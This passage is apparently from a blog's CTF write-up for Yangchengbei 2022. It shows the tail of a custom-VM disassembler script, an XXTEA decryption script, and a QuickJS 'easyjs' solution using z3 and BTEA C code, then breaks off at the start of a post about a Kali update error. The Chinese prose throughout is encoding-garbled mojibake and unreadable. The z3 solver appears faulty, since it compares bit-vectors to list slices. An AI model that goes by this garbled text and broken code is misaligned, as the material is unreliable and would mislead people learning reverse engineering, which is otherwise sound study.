class="number">16</span>]</span><br><span class="line">        v2 = opcode[v1]</span><br><span class="line">        v3 = opcode[v1+<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> v2==<span class="number">0xe0</span>:</span><br><span class="line">            r[<span class="number">16</span>] = v1+<span class="number">3</span></span><br><span class="line">            v4 = r[opcode[v1+<span class="number">2</span>]]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;r[<span class="subst">&#123;v3&#125;</span>] = r[<span class="subst">&#123;opcode[v1+<span class="number">2</span>]&#125;</span>]&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v4 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span>(v2&lt;&lt;<span class="number">24</span>):</span><br><span class="line">                r[<span class="number">16</span>] = v1+<span class="number">3</span></span><br><span class="line">                v2 -= <span class="number">1</span></span><br><span class="line">                v4 = opcode[v1+<span class="number">2</span>] | (v4&lt;&lt;<span class="number">8</span>)</span><br><span class="line">                v1 += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;r[<span class="subst">&#123;v3&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(v4)&#125;</span>&#x27;</span>)</span><br><span class="line">        r[v3] = v4</span><br><span class="line">    <span class="keyword">elif</span> result == <span class="number">1</span>:</span><br><span class="line">        v1 = r[<span class="number">16</span>]</span><br><span class="line">        tmp = v1</span><br><span class="line">        v2 = opcode[v1]</span><br><span class="line">        v3 = opcode[v1+<span class="number">1</span>]</span><br><span class="line">        v4 = opcode[v1+<span class="number">2</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> r[v2] == r[v3]:</span><br><span class="line">            v5 = v1+<span class="number">3</span>+v4</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;jmp <span class="subst">&#123;v5&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> v5==<span class="number">512</span>:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">hex</span>(mem[i]))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v5 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> v4:</span><br><span class="line">                r[<span class="number">16</span>] = v1+<span class="number">4</span></span><br><span class="line">                v4 -= <span class="number">1</span></span><br><span class="line">                v5 = opcode[v1+<span class="number">3</span>] | (v5&lt;&lt;<span class="number">8</span>)</span><br><span class="line">                v1 += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;if r[<span class="subst">&#123;v2&#125;</span>] != r[<span class="subst">&#123;v3&#125;</span>]: jmp <span class="subst">&#123;v5&#125;</span>&#x27;</span>)</span><br><span class="line">        r[<span class="number">16</span>] = v5</span><br><span class="line">    <span class="keyword">elif</span> result == <span class="number">2</span>:</span><br><span class="line">        v1 = r[<span class="number">16</span>]</span><br><span class="line">        v2 = opcode[v1]</span><br><span class="line">        v3 = opcode[v1+<span class="number">1</span>]</span><br><span class="line">        v4 = r[v3]</span><br><span class="line">        v5 = v1+<span class="number">4</span>*v4</span><br><span class="line">        v6 = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">4</span>,<span class="number">0</span>,<span class="number">1</span>):</span><br><span class="line">            r[<span class="number">16</span>] = v5+<span class="number">3</span></span><br><span class="line">            v6 = opcode[v5+<span class="number">2</span>] | v6&lt;&lt;<span class="number">8</span></span><br><span class="line">            v5 += <span class="number">1</span></span><br><span class="line">        <span class="comment"># v6 = opcode[v5+2]&lt;&lt;24 | opcode[v5+3]&lt;&lt;16 | opcode[v5+4]&lt;&lt;8 | opcode[v5+5]</span></span><br><span class="line">        r[<span class="number">16</span>] = v5 - <span class="number">4</span>*r[v3]+<span class="number">14</span></span><br><span class="line">        r[v2] = v6</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v2&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(v6)&#125;</span>   opcode[v1+4*r[opcode[v1+1]]+2]&lt;&lt;24 | opcode[v1+4*r[opcode[v1+1]]+3]&lt;&lt;16 | opcode[v1+4*r[opcode[v1+1]]+4]&lt;&lt;8 | opcode[v1+4*r[opcode[v1+1]]+5]&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> result == <span class="number">3</span>:</span><br><span class="line">        v2 = r[<span class="number">16</span>]</span><br><span class="line">        v3 = opcode[v2]</span><br><span class="line">        v4 = opcode[v2+<span class="number">1</span>]</span><br><span class="line">        v5 = r[v4]</span><br><span class="line">        r[<span class="number">16</span>] = v2+<span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span> opcode[v2+<span class="number">2</span>]==<span class="number">0xe2</span>:</span><br><span class="line">            mem[v5] = r[v3]</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v2)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;mem[<span class="subst">&#123;v5&#125;</span>] = r[<span class="subst">&#123;v3&#125;</span>]&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r[v3] = mem[v5]</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v2)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v3&#125;</span>] = mem[<span class="subst">&#123;v5&#125;</span>]&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> result == <span class="number">13</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(r[<span class="number">16</span>])+<span class="string">&#x27;:\treturn&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> result == <span class="number">14</span>:</span><br><span class="line">        v1 = r[<span class="number">16</span>]</span><br><span class="line">        v3 = v1+<span class="number">2</span></span><br><span class="line">        v4 = opcode[v1]</span><br><span class="line">        v5 = opcode[v1+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> v4 == <span class="number">0xe0</span>:</span><br><span class="line">            v6 = v1+<span class="number">3</span></span><br><span class="line">            r[<span class="number">16</span>] = v1+<span class="number">3</span></span><br><span class="line">            v7 = r[opcode[v1+<span class="number">2</span>]]</span><br><span class="line">            s = <span class="string">f&#x27;r[<span class="subst">&#123;opcode[v1+<span class="number">2</span>]&#125;</span>]&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v7 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span>(v4&lt;&lt;<span class="number">24</span>):</span><br><span class="line">                r[<span class="number">16</span>] = v3+<span class="number">1</span></span><br><span class="line">                v4 -= <span class="number">1</span></span><br><span class="line">                v7 = opcode[v3] | (v7&lt;&lt;<span class="number">8</span>)</span><br><span class="line">                v3 += <span class="number">1</span></span><br><span class="line">            s = <span class="built_in">hex</span>(v7)</span><br><span class="line">            v6 = v3</span><br><span class="line">        r[<span class="number">16</span>] = v6+<span class="number">1</span></span><br><span class="line">        res = opcode[v6]-<span class="number">0xff</span>-<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> res == -<span class="number">11</span>:</span><br><span class="line">            r[v5] = (r[v5] +v7)&amp;<span class="number">0xffffffff</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] += &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">10</span>:</span><br><span class="line">            r[v5] = (r[v5] - v7) &amp;<span class="number">0xffffffff</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] -= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">9</span>:</span><br><span class="line">            r[v5] *= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] *= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">8</span>:</span><br><span class="line">            r[v5] //= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] //= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">7</span>:</span><br><span class="line">            r[v5] &lt;&lt;= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] &lt;&lt;= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">6</span>:</span><br><span class="line">            r[v5] &gt;&gt;= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] &gt;&gt;= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">5</span>:</span><br><span class="line">            r[v5] ^= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] ^= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">4</span>:</span><br><span class="line">            r[v5] |= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] |= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">3</span>:</span><br><span class="line">            r[v5] &amp;= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] &amp;= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">&#x27;wrong2&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(r[<span class="number">16</span>])+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">&#x27;wrong&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>ï¼ˆå…¶ä¸­memå³ä¸ºè¾“å…¥ï¼Œæ‰‹åŠ¨ä»£äº†å‡ ä¸ªæ•°å­—æ–¹ä¾¿è°ƒè¯•ï¼‰</p>
<p>æŒ‰ç…§æµç¨‹ï¼Œæ‰“å°å‡º7000+è¡Œä»£ç ï¼Œå¤§è‡´è§‚å¯Ÿå‘ç°æœ‰æ˜æ˜¾çš„xxteaçš„ç‰¹å¾ï¼Œdelta=0xf4f3f2f1ï¼Œå¾ªç¯64è½®ï¼Œkey=[0xf1f2f3f4,0xf5f6f7f8,0xf9fafbfc,0xfdfefff0]</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/25.png" alt="25"></p>
<p>è§£å¯†æ— æœï¼ŒçŒœæµ‹æœ‰é­”æ”¹ï¼Œç»“æœåœ¨å¼€å¤´å’Œç»“å°¾åˆå‘ç°äº†ä¸€äº›åŠ å¯†ã€‚</p>
<p>å¼€å¤´å°†è¾“å…¥è°ƒæ¢ä½ç½®</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/26.png" alt="img"></p>
<p>ç»“å°¾å¼‚æˆ–0xf8f7f6f5å¹¶è°ƒæ¢ä½ç½®</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/27.png" alt="img"></p>
<p>è§£å¯†è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">0x55D37604</span>, <span class="number">0xB5FFA19E</span>, <span class="number">0xC202F734</span>, <span class="number">0x963BE91F</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    a[i] ^= <span class="number">0xf8f7f6f5</span></span><br><span class="line">t = a[<span class="number">3</span>]</span><br><span class="line">a[<span class="number">3</span>] = a[<span class="number">0</span>]</span><br><span class="line">a[<span class="number">0</span>] = t</span><br><span class="line">t = a[<span class="number">1</span>]</span><br><span class="line">a[<span class="number">1</span>] = a[<span class="number">2</span>]</span><br><span class="line">a[<span class="number">2</span>] = t</span><br><span class="line">a2 = [<span class="number">0xf1f2f3f4</span>,<span class="number">0xf5f6f7f8</span>,<span class="number">0xf9fafbfc</span>,<span class="number">0xfdfefff0</span>]</span><br><span class="line">v5 = <span class="number">0xf4f3f2f1</span></span><br><span class="line"><span class="comment"># n = 52//len(a) + 6</span></span><br><span class="line">v8 = v5*<span class="number">64</span></span><br><span class="line">v9 = a[<span class="built_in">len</span>(a)-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    j = <span class="built_in">len</span>(a)-<span class="number">2</span></span><br><span class="line">    v9 = a[j]</span><br><span class="line">    v6 = (v8&gt;&gt;<span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">    a[<span class="built_in">len</span>(a)-<span class="number">1</span>] = (a[<span class="built_in">len</span>(a)-<span class="number">1</span>] - (((v9 ^ a2[v6 ^ ((j+<span class="number">1</span>) &amp; <span class="number">3</span>)]) + (a[<span class="number">0</span>] ^ v8)) ^ (((<span class="number">16</span> * v9) ^ (a[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>)) + ((<span class="number">4</span> * a[<span class="number">0</span>]) ^ (v9 &gt;&gt; <span class="number">5</span>))))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">while</span>(j&gt;<span class="number">0</span>):</span><br><span class="line">        v9 = a[j-<span class="number">1</span>]</span><br><span class="line">        a[j] = (a[j] - (((v9 ^ a2[v6 ^ (j &amp; <span class="number">3</span>)]) + (a[j+<span class="number">1</span>] ^ v8)) ^ (((<span class="number">16</span> * v9) ^ (a[j+<span class="number">1</span>] &gt;&gt; <span class="number">3</span>)) + ((<span class="number">4</span> * a[j+<span class="number">1</span>]) ^ (v9 &gt;&gt; <span class="number">5</span>))))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        j -= <span class="number">1</span></span><br><span class="line">    v9 = a[<span class="built_in">len</span>(a)-<span class="number">1</span>]</span><br><span class="line">    a[<span class="number">0</span>] = (a[<span class="number">0</span>] - (((v9 ^ a2[v6 ^ (j &amp; <span class="number">3</span>)]) + (a[j+<span class="number">1</span>] ^ v8)) ^ (((<span class="number">16</span> * v9) ^ (a[j+<span class="number">1</span>] &gt;&gt; <span class="number">3</span>)) + ((<span class="number">4</span> * a[j+<span class="number">1</span>]) ^ (v9 &gt;&gt; <span class="number">5</span>))))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    v8 -= v5</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">3</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>]:                               <span class="built_in">print</span>(<span class="built_in">chr</span>(a[i]&gt;&gt;<span class="number">24</span>&amp;<span class="number">0xff</span>),<span class="built_in">chr</span>(a[i]&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xff</span>),<span class="built_in">chr</span>(a[i]&gt;&gt;<span class="number">8</span>&amp;<span class="number">0xff</span>),<span class="built_in">chr</span>(a[i]&amp;<span class="number">0xff</span>),end=<span class="string">&#x27;&#x27;</span>,sep=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># 1t_i5_3z_i5nt_it</span></span><br></pre></td></tr></table></figure>
<h3 id="easyjs"><a class="markdownIt-Anchor" href="#easyjs"></a> <strong>easyjs</strong></h3>
<p>quickjs,ä¸‹è½½æºç ç¼–è¯‘è¾“å‡ºå­—èŠ‚ç ï¼Œå…·ä½“å‚è€ƒ<a href="https://bbs.pediy.com/thread-259014.htm">https://bbs.pediy.com/thread-259014.htm</a></p>
<p>å­—èŠ‚ç ä¸­é¦–å…ˆè§‚å¯Ÿåˆ°äº†åˆå§‹åŒ–ä¸€äº›å¸¸é‡å‡½æ•°ä»¥åŠå­—ç¬¦ä¸²</p>
<p>å¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°ä¸€ä¸ªå¤§å°å†™äº’æ¢çš„base64è¡¨</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/28.png" alt="img"></p>
<p>å¾—åˆ°å­—èŠ‚ç å¼€å§‹åˆ†æevalå‡½æ•°ï¼Œè¿™ä¸ªç›¸å½“äºæ­£å¸¸çš„mainå‡½æ•°</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/29.png" alt="img"></p>
<p>è¿™é‡Œçš„æ„æ€åº”è¯¥æ˜¯encode64ï¼ˆenc1ï¼ˆï¼‰ï¼‰çš„æ„æ€ï¼Œæ‰€ä»¥å…ˆè°ƒç”¨enc1ï¼Œç„¶åå†è°ƒç”¨encode64</p>
<p>enc1é‡Œé¢å°±æ˜¯ä¸€ä¸ªBTEA delta mx keyéƒ½å¾ˆå®¹æ˜“çŸ¥é“ï¼Œä¸Šç½‘ä¸Šæ‰’ä¸€ä¸ªä»£ç å®ç°å°±è¡Œäº†</p>
<p>åé¢æ˜¯ä¸€ä¸ªé”™ä½å¼‚æˆ–ï¼Œ</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/30.png" alt="img"></p>
<p>æœ€åè°ƒç”¨äº†func5 func6å‡½æ•° func5å‡½æ•°æ˜¯ä¸€ä¸ªè½¬å¤§æ•´æ•°çš„æ–¹æ³•ï¼Œ</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/31.png" alt="img"></p>
<p>func6é‡Œé¢ä¸»è¦æ˜¯ä¸€å †çš„é€»è¾‘è¿ç®—ï¼Œç„¶åä¸å·²çŸ¥é‡æ¯”è¾ƒï¼Œ</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/32.png" alt="32"></p>
<p>å°†data3 15ä¸ªæ•°å­—åˆ†ä¸ºä¸‰ç»„ï¼Œç„¶åè¿›è¡Œæ¯”è¾ƒï¼Œæ‹¿z3è§£ä¸€ä¸‹</p>
<p>æ€»ç»“ä¸€ä¸‹å°±æ˜¯å…ˆé€†å‡ºæ¥é€»è¾‘è¿ç®—ã€ç„¶åæ˜¯å¼‚æˆ–ã€base64ã€BTEAå†™è„šæœ¬è§£å°±è¡Œäº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">data3 = [<span class="number">5911837666743816200</span>,</span><br><span class="line"><span class="number">5133585975960501272</span>,</span><br><span class="line"><span class="number">9082418069800623372</span>,</span><br><span class="line"><span class="number">9154480062992383756</span>,</span><br><span class="line"><span class="number">6848599583376686600</span>,</span><br><span class="line"><span class="number">147787617043219975</span>,</span><br><span class="line"><span class="number">6140429622497212985</span>,</span><br><span class="line"><span class="number">2526269866358605591</span>,</span><br><span class="line"><span class="number">4552892036882908959</span>,</span><br><span class="line"><span class="number">4543304157965338119</span>,</span><br><span class="line"><span class="number">4620825451554930944</span>,</span><br><span class="line"><span class="number">8808899373961281307</span>,</span><br><span class="line"><span class="number">5924901230665995531</span>,</span><br><span class="line"><span class="number">8808899373961281307</span>,</span><br><span class="line"><span class="number">8662527953563041043</span>]</span><br><span class="line"></span><br><span class="line">data4 = [<span class="number">2101524238053948931</span>,</span><br><span class="line"><span class="number">9154814254531429383</span>,</span><br><span class="line"><span class="number">8941618984500083987</span>]</span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    data5 = [BitVec(<span class="string">&quot;x%d&quot;</span> % i, <span class="number">64</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    x = data5[<span class="number">0</span>]</span><br><span class="line">    y = data5[<span class="number">1</span>]</span><br><span class="line">    z = data5[<span class="number">2</span>]</span><br><span class="line">    w = data5[<span class="number">3</span>]</span><br><span class="line">    a = ~x &amp; z</span><br><span class="line">    b = (z &amp; ~x | (x&amp;y) | (z &amp; (~y)) | (x &amp; (~y)) ) ^ w</span><br><span class="line">    c = (z &amp; ~y &amp; x)| (z &amp; ((x &amp; y) | (y &amp; (~x)) | ~(y | x)))</span><br><span class="line">    d = (z &amp; ~x) | (x &amp; y) | (z &amp; ~y) | (x &amp; ~y)</span><br><span class="line">    e = (z &amp; ~x) | (x&amp;y) | (y&amp;z)</span><br><span class="line">    s = Solver()</span><br><span class="line">    s.add(a == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.add(b == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.add(c == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.add(d == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.add(e == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.add(y == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.check()</span><br><span class="line">    m = s.model()</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data5:</span><br><span class="line">        res.append(<span class="built_in">int</span>(<span class="built_in">str</span>(m[i])))</span><br><span class="line">    <span class="comment">#print(res)</span></span><br><span class="line">    </span><br><span class="line">    aa = []</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> res:</span><br><span class="line">        k = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            k.append(r &amp; <span class="number">0xff</span>)</span><br><span class="line">            r &gt;&gt;= <span class="number">8</span></span><br><span class="line">        aa += k</span><br><span class="line">    data += aa</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(data)</span><br><span class="line"></span><br><span class="line">data[-<span class="number">1</span>] = data[-<span class="number">1</span>]^data[<span class="number">1</span>]</span><br><span class="line">data[-<span class="number">2</span>] = data[-<span class="number">2</span>]^data[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">3</span>, -<span class="number">1</span>)[::-<span class="number">1</span>]:</span><br><span class="line">    data[i] ^= data[i+<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(data))</span><br><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"> </span><br><span class="line">using namespace std;</span><br><span class="line"> </span><br><span class="line"><span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"><span class="comment">#define DELTA 289739796</span></span><br><span class="line"><span class="comment">#define MX (((z &gt;&gt; 6) ^ (y &lt;&lt; 3)) + ((y &gt;&gt; 4) ^ (z &lt;&lt; 5)) ^ ((sum^y) + (secret[(p&amp;3)^e] ^ z)))  </span></span><br><span class="line"> </span><br><span class="line">  void btea(uint32_t *vector, <span class="built_in">int</span> n, uint32_t const secret[<span class="number">4</span>]) &#123;</span><br><span class="line">    uint32_t y, z, <span class="built_in">sum</span>;</span><br><span class="line">    unsigned p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;          </span><br><span class="line">      rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">      <span class="built_in">sum</span> = <span class="number">0</span>;</span><br><span class="line">      z = vector[n-<span class="number">1</span>];</span><br><span class="line">      do &#123;</span><br><span class="line">        <span class="built_in">sum</span> += DELTA;</span><br><span class="line">        e = (<span class="built_in">sum</span> &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n-<span class="number">1</span>; p++) &#123;</span><br><span class="line">          y = vector[p+<span class="number">1</span>];</span><br><span class="line">          z = vector[p] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        y = vector[<span class="number">0</span>];</span><br><span class="line">        z = vector[n-<span class="number">1</span>] += MX;</span><br><span class="line">      &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; -<span class="number">1</span>) &#123;  </span><br><span class="line">      n = -n;</span><br><span class="line">      rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">      <span class="built_in">sum</span> = rounds*DELTA;</span><br><span class="line">      y = vector[<span class="number">0</span>];</span><br><span class="line">      do &#123;</span><br><span class="line">        e = (<span class="built_in">sum</span> &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (p=n-<span class="number">1</span>; p&gt;<span class="number">0</span>; p--) &#123;</span><br><span class="line">          z = vector[p-<span class="number">1</span>];</span><br><span class="line">          y = vector[p] -= MX;</span><br><span class="line">        &#125;</span><br><span class="line">        z = vector[n-<span class="number">1</span>];</span><br><span class="line">        y = vector[<span class="number">0</span>] -= MX;</span><br><span class="line">      &#125; <span class="keyword">while</span> ((<span class="built_in">sum</span> -= DELTA) != <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    char secret[<span class="number">17</span>] = <span class="string">&quot;welcometoycb2022&quot;</span>;</span><br><span class="line">    uint8_t buf[] = &#123;<span class="number">50</span>, <span class="number">145</span>, <span class="number">242</span>, <span class="number">166</span>, <span class="number">198</span>, <span class="number">128</span>, <span class="number">32</span>, <span class="number">9</span>, <span class="number">222</span>, <span class="number">204</span>, <span class="number">87</span>, <span class="number">158</span>, <span class="number">160</span>, <span class="number">147</span>, <span class="number">155</span>, <span class="number">82</span>, <span class="number">71</span>, <span class="number">9</span>, <span class="number">38</span>, <span class="number">246</span>, <span class="number">0</span>, <span class="number">88</span>, <span class="number">185</span>, <span class="number">225</span>, <span class="number">62</span>, <span class="number">226</span>, <span class="number">31</span>, <span class="number">171</span>, <span class="number">199</span>, <span class="number">245</span>, <span class="number">106</span>, <span class="number">31</span>&#125;;</span><br><span class="line">    btea((uint32_t*)buf,-<span class="number">8</span>,(uint32_t*)secret);</span><br><span class="line">    <span class="keyword">for</span>(<span class="built_in">int</span> j=<span class="number">0</span>;j&lt;<span class="number">32</span>;j++)</span><br><span class="line">        printf(<span class="string">&quot;%c&quot;</span>,buf[j]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Crypto</tag>
        <tag>Reverse</tag>
        <tag>Pwn</tag>
        <tag>Misc</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>kaliå‡çº§æŠ¥é”™æ²¡æœ‰ Release æ–‡ä»¶</title>
    <url>/2022/09/kail%E5%8D%87%E7%BA%A7%E6%8A%A5%E9%94%99%EF%BC%9AE%20%E4%BB%93%E5%BA%93%20%E2%80%9Chttpsdownload.docker.comlinuxdebian%20kali-rolling%20Release%E2%80%9D%20%E6%B2%A1%E6%9C%89%20Release%20%E6%96%87%E4%BB%B6%E3%80%82/</url>
    <content><![CDATA[<p>å†™åœ¨å‰é¢ï¼Œè¿™æ˜¯æˆ‘åœ¨ä½¿ç”¨kaliçš„è¿‡ç¨‹ä¸­é‡åˆ°çš„é—®é¢˜</p>
<span id="more"></span>
<h4 id="é—®é¢˜"><a class="markdownIt-Anchor" href="#é—®é¢˜"></a> é—®é¢˜</h4>
